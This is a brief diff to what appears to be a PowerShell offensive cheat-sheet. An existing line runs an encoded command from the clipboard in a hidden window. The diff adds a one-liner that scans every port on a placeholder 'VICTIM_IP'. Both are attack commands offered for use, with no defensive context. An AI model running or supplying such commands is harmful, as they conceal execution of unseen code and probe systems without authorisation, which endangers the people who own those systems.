@@ -1,3 +1,6 @@
 Run encoded powershell from clipboard
 	& powershell -Widow Hidden -enc $(get-clipboard)
 
+Portscan one-liner
+	0..65535 | % {echo ((new-object Net.Sockets.TcpClient).Connect(VICTIM_IP,$_)) "Port $_ is open!"} 2>$null
+
